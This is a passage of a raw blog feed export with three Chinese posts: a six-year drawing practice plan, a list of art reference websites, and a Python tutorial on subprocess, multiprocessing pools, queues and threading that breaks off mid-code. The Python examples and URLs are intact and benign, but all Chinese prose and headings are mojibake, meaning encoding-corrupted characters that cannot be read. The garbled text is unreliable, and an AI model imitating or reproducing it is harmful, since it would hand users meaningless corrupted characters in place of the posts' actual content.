        <content type="html"><![CDATA[<p>å‚è€ƒ<a href="https://www.bilibili.com/video/BV1a44y1C7Dj">æŠ–æŠ–æ‘</a>çš„æ—¶é—´åˆ†é…è®¡åˆ’, æ€»å…±6å¹´ï¼Œæ¯å¤©3å°æ—¶ä»¥ä¸Šçš„ç»˜ç”»ç»ƒä¹ </p><h2 id="0-6-ä¸ªæœˆ"><a href="#0-6-ä¸ªæœˆ" class="headerlink" title="0~6 ä¸ªæœˆ"></a>0~6 ä¸ªæœˆ</h2><p>è¿ç¬”ç»ƒä¹ ä»¥åŠå…´è¶£åŸ¹å…»</p><h2 id="6ä¸ªæœˆ-1å¹´"><a href="#6ä¸ªæœˆ-1å¹´" class="headerlink" title="6ä¸ªæœˆ ~ 1å¹´"></a>6ä¸ªæœˆ ~ 1å¹´</h2><p>è¿™ä¸ªé˜¶æ®µè¦ç²¾å‡†ä¸´æ‘¹</p><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/1.png"></p><p>å¦‚æœç²¾å‡†ä¸´æ‘¹æ²¡æœ‰ç»ƒä¹ å¥½ï¼Œé‚£ä¹ˆåé¢çš„é€è§†ã€æ˜æš—ã€äººä½“ç»“æ„ã€æ„å›¾æ•ˆæœéƒ½ä¼šå¤§æ‰“æŠ˜æ‰£</p><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/2.png"></p><h2 id="1-2-å¹´"><a href="#1-2-å¹´" class="headerlink" title="1 ~ 2 å¹´"></a>1 ~ 2 å¹´</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/3.png"></p><p>åœ¨è¿™ä¸ªé˜¶æ®µè€å¿ƒå®ŒæˆåŸç¨¿</p><h2 id="2-3-å¹´"><a href="#2-3-å¹´" class="headerlink" title="2 ~ 3 å¹´"></a>2 ~ 3 å¹´</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/4.png"></p><p>è¿™ä¸ªé˜¶æ®µä¸»è¦æ˜¯é€Ÿå†™å¹¶å½¢æˆç§¯ç´¯</p><p><a href="/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/" title="ç»˜ç”»æœ€é€‚åˆå­¦ä¹ çš„æ„å›¾å’Œå…‰å½±çš„ç”µå½±">ç»˜ç”»æœ€é€‚åˆå­¦ä¹ çš„æ„å›¾å’Œå…‰å½±çš„ç”µå½±</a></p><p>å·²æˆç¨¿ä¸ºå¯¼å‘ï¼Œé€šè¿‡ç”»æˆç¨¿ï¼Œå‘ç°é—®é¢˜ï¼Œè§£å†³é—®é¢˜ï¼Œç„¶åç»§ç»­ç”»æˆç¨¿çš„æ–¹å¼æ¥æå‡è‡ªå·±ã€‚</p><h2 id="3-4-å¹´"><a href="#3-4-å¹´" class="headerlink" title="3 ~ 4 å¹´"></a>3 ~ 4 å¹´</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/5.png"></p><p>è¿™é‡Œçš„æˆç¨¿å·²ç»æ˜¯ä»£è¡¨è‡ªå·±æœ€é«˜ç ”ç©¶æˆæœçš„æˆç¨¿äº†</p><p>ç„¶åå°±æ˜¯é‡æ–°é€šè¿‡é€Ÿæ¶‚å®¡è§†è‡ªå·±çš„åŸºæœ¬åŠŸï¼Œå‘æ˜æ›´æ·±ä¸€å±‚æ¬¡çš„ä¸œè¥¿</p><h2 id="4-6-å¹´"><a href="#4-6-å¹´" class="headerlink" title="4 ~ 6 å¹´"></a>4 ~ 6 å¹´</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/6.png"></p><p>è¿™ä¸ªé˜¶æ®µç»˜ç”»æ°´å¹³å·²ç»æ›´é«˜äº†ï¼Œæƒ³è¦æ›´è¿›ä¸€æ­¥çš„æå‡è®¾è®¡ã€æ„å›¾ã€è®²æ•…äº‹çš„èƒ½åŠ›ï¼Œå°±éœ€è¦ç”¨å†å²ã€ä¼ ç»Ÿè‰ºæœ¯ã€æ‘„å½±ç­‰æ¥æ­¦è£…è‡ªå·±ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»˜ç”»ç½‘ç«™æ¨è</title>
      <link href="/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
      <url>/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<p>brusheezyï¼ˆå…è´¹ç¬”åˆ·ç½‘ç«™ï¼‰<a href="http://www.brusheezy.com/">www.brusheezy.com</a><br>itsnicethat (æ’ç”»å¸ˆåˆ›ä½œåˆ†äº«ç½‘ç«™)  <a href="http://www.itsnicethat.com/">www.itsnicethat.com</a><br>xuehuahua (åŸºç¡€æ•™ç¨‹) <a href="http://www.xuehuahua.cc/">www.xuehuahua.cc</a></p><p>mixkit (ä¼˜ç§€æ’ç”»ä½œå“å‚è€ƒ) <a href="https://mixkit.co/free-stock-art">https://mixkit.co/free-stock-art</a><br>çš®å…‹æ–¯ ï¼ˆæ‘„å½±ä½œå“å‚è€ƒï¼‰ <a href="http://www.pexels.com/">www.pexels.com</a><br>500px  ï¼ˆæ— ç‰ˆæƒç…§ç‰‡ç´ æç½‘ï¼‰<a href="https://500px.com.cn/">https://500px.com.cn</a></p><p>pixivic  ï¼ˆpç«™é•œåƒç«™å°ç²‰çº¢ï¼‰ <a href="http://www.pixivic.com/">www.pixivic.com</a><br>GGAC  ï¼ˆå›½å†…æƒå¨çš„ CGç½‘ç«™ï¼‰<a href="http://www.ggac.com/v2/home">www.ggac.com/v2/home</a><br>cgsociety ï¼ˆç¾å›½æƒå¨çš„ CGç½‘ç«™ï¼‰<a href="http://www.cgsociety.org/">www.cgsociety.org</a></p><p>èŠ±ç“£ ç«™é…· å¾®å…ƒç´  å †ç³– çŸ¥å¦–ç›´æ¥æœç´¢åå­—å°±å¥½</p><p>Pinterest (æœ€å¼ºè”æƒ³ç´ ææœç´¢) <a href="https://www.pinterest.com/">https://www.pinterest.com/</a><br>sketchfab (3Dæ¨¡å‹å‚è€ƒ) <a href="https://sketchfab.com/3d-models">https://sketchfab.com/3d-models</a><br>bodiesinmotion ï¼ˆäººç‰©åŠ¨æ€ä¸è¡¨æƒ…å‚è€ƒï¼‰<a href="https://www.bodiesinmotion.photo/">https://www.bodiesinmotion.photo</a><br>posemaniacs (360åº¦è§‚å¯Ÿäººä½“è‚Œè‚‰) <a href="https://www.posemaniacs.com/zh-Hans">https://www.posemaniacs.com/zh-Hans</a><br>getbodysmart  ï¼ˆäººä½“éª¨éª¼è‚Œè‚‰ç¥ç»ç³»ç»Ÿï¼‰<a href="http://www.getbodysmart.com/">www.getbodysmart.com</a><br>quickposes (å§¿åŠ¿é€Ÿå†™ç»ƒä¹ ) <a href="https://quickposes.com/en">https://quickposes.com/en</a><br>line-of-action  (äººç‰© åŠ¨ç‰©é€Ÿå†™ç»ƒä¹ )   <a href="https://line-of-action.com/">https://line-of-action.com</a><br>x6ud (é€šè¿‡æ‘†åŠ¨éª¨éª¼æœç´¢å¯¹åº”åŠ¨ä½œå›¾ç‰‡) <a href="https://x6ud.github.io/female-anatomy-for-artist-search-helper/#/">https://x6ud.github.io/female-anatomy-for-artist-search-helper/#/</a></p><p>chojugiga ï¼ˆåŠ¨ç‰©æ‹Ÿäººå‚è€ƒï¼‰<a href="http://www.chojugiga.com/">www.chojugiga.com</a><br>pixelsquid ï¼ˆå„ç§ç‰©ä½“ç”»æ³•å‚è€ƒï¼‰<a href="http://www.pixelsquid.com/png">www.pixelsquid.com/png</a><br>microsculpture  ï¼ˆå„ç§æ˜†è™«å›¾ç‰‡ï¼‰<a href="http://www.microsculpture.net/">www.microsculpture.net</a><br>withawish  ï¼ˆç‡•å°¾æœå‚è€ƒç½‘ç«™ï¼‰<a href="http://www.withawish.jp/">www.withawish.jp</a><br>uenoya ï¼ˆéœ¸é“æ€»è£é•¿å¤–å¥—ï¼‰ <a href="https://long-coat.uenoya.jp/">https://long-coat.uenoya.jp</a></p><p>musinsa  ï¼ˆç»ƒä¹ é€Ÿå†™å’Œè¤¶çš±ï¼‰<a href="https://m.store.musinsa.com/app/styles/lists">https://m.store.musinsa.com/app/styles/lists</a><br>|screenmusings ï¼ˆç”µå½±å›¾çš„å‚è€ƒç½‘ç«™ï¼‰<a href="http://www.screenmusings.org/">www.screenmusings.org</a><br>Filmgrab  ï¼ˆå…¨ä¸–ç•Œçš„ç”µå½±æˆªå›¾ï¼‰<a href="https://film-grab.com/">https://Film-grab.com</a><br>impawards ï¼ˆç”µå½±æµ·æŠ¥ç´ æï¼‰<a href="http://www.impawards.com/">http://www.impawards.com/</a></p><p>nipponcolors ï¼ˆæ—¥æœ¬é…è‰²ç½‘ç«™ï¼‰ <a href="https://nipponcolors.com/">https://nipponcolors.com/</a><br>coolors  ï¼ˆæ–°æ‰‹é…è‰²ç½‘ç«™ï¼‰ <a href="https://coolors.co/">https://coolors.co/</a><br>Yorke Antique Textilesï¼ˆçº¹ç†å›¾æ¡ˆç½‘ç«™ï¼‰ <a href="https://www.yorkeantiquetextiles.com/">https://www.yorkeantiquetextiles.com/</a><br>loftcn (æˆ¿å±‹è®¾è®¡ç½‘ç«™)  <a href="https://loftcn.com/">https://loftcn.com/</a><br>indienova (æ¸¸æˆè®¾è®¡å¿ƒå¾—åˆ†äº«ç½‘ç«™) <a href="https://indienova.com/channel/design">https://indienova.com/channel/design</a></p><p>Petalica paint (è‡ªåŠ¨çº¿ç¨¿ä¸Šè‰²æœåŠ¡) <a href="https://petalica-paint.pixiv.dev/index_zh.html">https://petalica-paint.pixiv.dev/index_zh.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python è¿›ç¨‹ä¸çº¿ç¨‹</title>
      <link href="/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹æœ€å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>Master-Worker</code>çš„è®¾è®¡æ¨¡å¼</p><h2 id="å¤šè¿›ç¨‹"><a href="#å¤šè¿›ç¨‹" class="headerlink" title="å¤šè¿›ç¨‹"></a>å¤šè¿›ç¨‹</h2><p><strong>å¤šè¿›ç¨‹</strong>ä¸å…±äº«å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥å˜é‡å°†ä¼šæ‹·è´ä¸€ä»½å‰¯æœ¬åˆ°æ–°çš„è¿›ç¨‹ä¸­ã€‚</p><p>è¿›ç¨‹å¯ä»¥åœ¨ä¸åŒçš„CPUæ ¸å¿ƒä¸Šåˆ‡æ¢ï¼ŒUnixä½¿ç”¨çš„åº•å±‚çš„<code>fork()</code>å‡½æ•°ï¼Œè€Œwindowsæ”¯æŒçš„å¹¶ä¸å¥½ï¼Œæ‰€ä»¥åªèƒ½æœ€å¤§é™åº¦æ¨¡æ‹Ÿã€‚</p><p>é€šç”¨çš„å°è£…æ¨¡å—æœ‰ä¸¤ä¸ªã€‚<code>subprocess</code>å’Œ<code>multiprocessing</code></p><p>è°ƒç”¨å¤–éƒ¨ç¨‹åºä½¿ç”¨çš„æ˜¯<code>subprocess</code>ï¼Œè€Œåˆ›å»ºæ–°çš„è¿›ç¨‹å¾€å¾€ä½¿ç”¨çš„æ˜¯<code>multiprocessing</code></p><ul><li><a href="https://blog.csdn.net/huangpo001/article/details/106254480">å¦‚ä½•è·å–è¿”å›å€¼</a></li></ul><h3 id="è°ƒç”¨å¤–éƒ¨ç¨‹åº"><a href="#è°ƒç”¨å¤–éƒ¨ç¨‹åº" class="headerlink" title="è°ƒç”¨å¤–éƒ¨ç¨‹åº"></a>è°ƒç”¨å¤–éƒ¨ç¨‹åº</h3><p>å½“è°ƒç”¨çš„å¤–éƒ¨ç¨‹åºä¸éœ€è¦å¤æ‚äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>call</code>æ–¹æ³•ç›´æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œç„¶åå¾—åˆ°è¿”å›ã€‚<br><code>call</code>æ–¹æ³•æ˜¯æ‹¥å¡çš„ï¼Œå°†ä¼šç­‰åˆ°å­è¿›ç¨‹ç»“æŸæ‰ä¼šç»§ç»­æ‰§è¡Œçˆ¶è¿›ç¨‹ã€‚</p><p>å½“è°ƒç”¨çš„å¤–éƒ¨ç¨‹åºæœ‰å¤æ‚äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>Popen</code>æ–¹æ³•ã€‚<br><code>Popen</code>æ–¹æ³•æ˜¯éæ‹¥å¡çš„ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">r = subprocess.call([<span class="hljs-string">&#x27;nslookup&#x27;</span>, <span class="hljs-string">&#x27;python.org&#x27;</span>])</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exit code:&#x27;</span>, r)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">p = subprocess.Popen([<span class="hljs-string">&#x27;nslookup&#x27;</span>], stdin=subprocess.PIPE,</span><span class="line">                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><span class="line"></br></span><span class="line">output, error = p.communicate(<span class="hljs-string">b&#x27;setq=mx\npython.org\nexit\n&#x27;</span>)</span><span class="line"><span class="hljs-built_in">print</span>(output.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return Code:&#x27;</span>, p.returncode)</span></code></pre></div></div><h3 id="åˆ›å»ºå­è¿›ç¨‹"><a href="#åˆ›å»ºå­è¿›ç¨‹" class="headerlink" title="åˆ›å»ºå­è¿›ç¨‹"></a>åˆ›å»ºå­è¿›ç¨‹</h3><p>åˆ›å»ºå­è¿›ç¨‹ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”¨<code>multiprocessing.Process</code>è¿›è¡Œå•æ¬¡åˆ›å»ºï¼Œå¦ä¸€ç§å°±æ˜¯ä½¿ç”¨<code>multiprocessing.Pool</code>åˆ›å»ºä¸€ä¸ªæ± ï¼Œç„¶åç®¡ç†æ± ä¸­å­è¿›ç¨‹.</p><h4 id="multiprocessing-Process"><a href="#multiprocessing-Process" class="headerlink" title="multiprocessing.Process"></a>multiprocessing.Process</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_child</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    sleep(<span class="hljs-number">1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run child name %s, pid is %s&#x27;</span> % (name, os.getpid()))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())</span><span class="line marked">    p = Process(target=run_child, args=(<span class="hljs-string">&#x27;test&#x27;</span>,))</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start child process&#x27;</span>)</span><span class="line">    p.start()  <span class="hljs-comment"># ä¼šè‡ªåŠ¨è°ƒç”¨run_childå‡½æ•°</span></span><span class="line">    p.join()  <span class="hljs-comment"># ä¼šç­‰å¾…å­è¿›ç¨‹ç»“æŸåå†ç»§ç»­å¾€ä¸‹è¿è¡Œ</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process end&#x27;</span>)</span></code></pre></div></div><h4 id="multiprocessing-Pool"><a href="#multiprocessing-Pool" class="headerlink" title="multiprocessing.Pool"></a>multiprocessing.Pool</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool, cpu_count</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">long_time_wait</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Run task %s, pid is %s&quot;</span> % (name, os.getpid()))</span><span class="line">    start_time = time.time()</span><span class="line">    time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line">    end_time = time.time()</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Task %s runs %0.2f sec&quot;</span> % (name, (end_time - start_time)))</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;hello <span class="hljs-subst">&#123;name&#125;</span>&#x27;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Parent pid is %s&quot;</span> % os.getpid())</span><span class="line marked">    p = Pool(cpu_count())  <span class="hljs-comment"># è¿™ä¸ªæ˜¯è¿›ç¨‹æ± ï¼Œé»˜è®¤æ˜¯CPUæ ¸æ•°ï¼Œå¯ä»¥è‡ªå·±æŒ‡å®š</span></span><span class="line">    jobs = []</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;subprocess Start&quot;</span>)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):</span><span class="line marked">        jobs.append(p.apply_async(long_time_wait, args=(i,)))  <span class="hljs-comment"># è¿™ä¸ªæ˜¯å¼‚æ­¥çš„ï¼Œå¼‚æ­¥çš„æ‰§è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çš„è¿›ç¨‹</span></span><span class="line">        <span class="hljs-comment"># jobs.append(p.apply(long_time_wait, args=(1,)))  # è¿™ä¸ªæ˜¯åŒæ­¥çš„ï¼ŒåŒæ­¥çš„æ‰§è¡Œï¼Œä¼šé˜»å¡å½“å‰çš„è¿›ç¨‹</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before close&#x27;</span>)</span><span class="line">    p.close() <span class="hljs-comment"># å…³é—­è¿›ç¨‹æ± ï¼Œè¡¨ç¤ºä¸èƒ½å†å¾€è¿›ç¨‹æ± ä¸­æ·»åŠ è¿›ç¨‹ï¼Œéœ€è¦åœ¨joinä¹‹å‰è°ƒç”¨</span></span><span class="line">    p.join() <span class="hljs-comment"># ç­‰å¾…è¿›ç¨‹æ± ä¸­çš„æ‰€æœ‰è¿›ç¨‹æ‰§è¡Œå®Œæ¯•</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All subprocess done&quot;</span>)</span><span class="line">    <span class="hljs-keyword">for</span> job <span class="hljs-keyword">in</span> jobs:</span><span class="line">        <span class="hljs-built_in">print</span>(job.get()) <span class="hljs-comment"># è·å–è¿›ç¨‹çš„è¿”å›å€¼</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment">## output:</span></span><span class="line"><span class="hljs-comment">#Parent pid is 14068</span></span><span class="line"><span class="hljs-comment">#subprocess Start</span></span><span class="line"><span class="hljs-comment">#before close</span></span><span class="line"><span class="hljs-comment">#Run task 0, pid is 7984</span></span><span class="line"><span class="hljs-comment">#Run task 1, pid is 12564</span></span><span class="line"><span class="hljs-comment">#Run task 2, pid is 12380</span></span><span class="line"><span class="hljs-comment">#Run task 3, pid is 5828</span></span><span class="line"><span class="hljs-comment">#Run task 4, pid is 14752</span></span><span class="line"><span class="hljs-comment">#Run task 5, pid is 7124</span></span><span class="line"><span class="hljs-comment">#Run task 6, pid is 16648</span></span><span class="line"><span class="hljs-comment">#Run task 7, pid is 2712</span></span><span class="line"><span class="hljs-comment">#Task 1 runs 0.36 sec</span></span><span class="line"><span class="hljs-comment">#Run task 8, pid is 12564</span></span><span class="line"><span class="hljs-comment">#Task 6 runs 0.87 sec</span></span><span class="line"><span class="hljs-comment">#Run task 9, pid is 16648</span></span><span class="line"><span class="hljs-comment">#Task 0 runs 0.93 sec</span></span><span class="line"><span class="hljs-comment">#Task 2 runs 1.30 sec</span></span><span class="line"><span class="hljs-comment">#Task 8 runs 1.20 sec</span></span><span class="line"><span class="hljs-comment">#Task 4 runs 2.73 sec</span></span><span class="line"><span class="hljs-comment">#Task 3 runs 2.84 sec</span></span><span class="line"><span class="hljs-comment">#Task 5 runs 2.84 sec</span></span><span class="line"><span class="hljs-comment">#Task 9 runs 2.02 sec</span></span><span class="line"><span class="hljs-comment">#Task 7 runs 2.97 sec</span></span><span class="line"><span class="hljs-comment">#All subprocess done</span></span></code></pre></div></div><p>å¦å¤–å¦‚æœæƒ³ä½¿ç”¨<strong>è£…é¥°å™¨</strong>çš„è¯æ˜¯ä¼šæœ‰é—®é¢˜çš„ï¼Œå‚è€ƒ<a href="https://stackoverflow.com/questions/9336646/python-decorator-with-multiprocessing-fails">è¿™ç¯‡æ–‡ç« </a>, è§£å†³åŠæ³•åªèƒ½ä½¿ç”¨ç­‰ä»·å½¢å¼è°ƒç”¨ã€‚</p><h3 id="è¿›ç¨‹é—´é€šè®¯"><a href="#è¿›ç¨‹é—´é€šè®¯" class="headerlink" title="è¿›ç¨‹é—´é€šè®¯"></a>è¿›ç¨‹é—´é€šè®¯</h3><p>è¿›ç¨‹é—´çš„é€šè®¯ä½¿ç”¨çš„æ˜¯<code>multiprocessing.Queue</code>é˜Ÿåˆ—</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]:</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Put %s in queue&#x27;</span> % value)</span><span class="line marked">        q.put(value)</span><span class="line">        time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line marked">        value = q.get(<span class="hljs-literal">True</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Get %s from queue&#x27;</span> % value)</span><span class="line">        time.sleep(<span class="hljs-number">0.1</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    q = Queue()</span><span class="line">    pw = Process(target=write, args=(q,))</span><span class="line">    pr = Process(target=read, args=(q,))</span><span class="line">    pw.start()</span><span class="line">    pr.start()</span><span class="line">    pw.join()</span><span class="line">    pr.terminate() <span class="hljs-comment"># ç”±äºreadæ˜¯æ­»å¾ªç¯ï¼Œéœ€è¦å¼ºåˆ¶ç»“æŸ</span></span></code></pre></div></div><p><code>Process</code>ä¸­æœ‰<code>terminate</code>æ–¹æ³•å¼ºåˆ¶ç»“æŸï¼Œä½†æ˜¯çº¿ç¨‹ä¸­æ²¡æœ‰ã€‚</p><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><p><strong>å¤šçº¿ç¨‹</strong>å…±äº«ä¸€ä¸ªå†…å­˜ç©ºé—´ï¼Œè°ƒç”¨çš„å˜é‡ä¹Ÿæ˜¯åŒä¸€ä¸ªã€‚</p><p>å¤šçº¿ç¨‹pythonæ”¯æŒçš„ä¸é”™ï¼Œä½†æ˜¯ä»¥ä¸‹å‡ ç‚¹å¿…é¡»æ³¨æ„ï¼š</p><ol><li>åœ¨è¯»å†™å…¨å±€å˜é‡çš„æ—¶å€™å¿…é¡»åŠ å…¥çº¿ç¨‹é”ï¼Œå¹¶ä¸”ç¡®ä¿é‡Šæ”¾</li><li>å¤šçº¿ç¨‹çš„å˜é‡<strong>ä¼ å‚</strong>ä½¿ç”¨<code>threading.Local</code>å¯¹è±¡</li><li>pythonçš„å¤šçº¿ç¨‹åªèƒ½åˆ©ç”¨ä¸€æ ¸ï¼Œè¦ä½¿ç”¨å¤šæ ¸å°±å¿…é¡»è¦ç”¨åˆ°å¤šè¿›ç¨‹äº†</li></ol><p>ä½†æ˜¯ä¸å¾—ä¸è¯´ï¼Œå¤šçº¿ç¨‹æ²¡æœ‰åç¨‹å¥½ç”¨ï¼Œå¹¶ä¸”æ•ˆç‡æ²¡æœ‰åç¨‹é«˜ã€‚<a href="/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/" title="python å¼‚æ­¥IO">python å¼‚æ­¥IO</a></p><h3 id="ä¸å¸¦è¯»å†™çš„å¤šçº¿ç¨‹åˆ›å»º"><a href="#ä¸å¸¦è¯»å†™çš„å¤šçº¿ç¨‹åˆ›å»º" class="headerlink" title="ä¸å¸¦è¯»å†™çš„å¤šçº¿ç¨‹åˆ›å»º"></a>ä¸å¸¦è¯»å†™çš„å¤šçº¿ç¨‹åˆ›å»º</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loop</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s&#x27;</span> % threading.current_thread().name)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s &gt;&gt;&gt; %s&#x27;</span> % (threading.current_thread().name, i))</span><span class="line">        time.sleep(random.random())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s Done&#x27;</span> % threading.current_thread().name)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread: &#x27;</span>, threading.current_thread().name)</span><span class="line marked">t = threading.Thread(target=loop, name=<span class="hljs-string">&#x27;LoopThread&#x27;</span>)</span><span class="line">t.start()</span><span class="line">t.join()</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread %s Done&#x27;</span> % threading.current_thread().name)</span></code></pre></div></div><h3 id="è¯»å†™å¸¦è¿›ç¨‹é”çš„å¤šçº¿ç¨‹åˆ›å»º"><a href="#è¯»å†™å¸¦è¿›ç¨‹é”çš„å¤šçº¿ç¨‹åˆ›å»º" class="headerlink" title="è¯»å†™å¸¦è¿›ç¨‹é”çš„å¤šçº¿ç¨‹åˆ›å»º"></a>è¯»å†™å¸¦è¿›ç¨‹é”çš„å¤šçº¿ç¨‹åˆ›å»º</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span 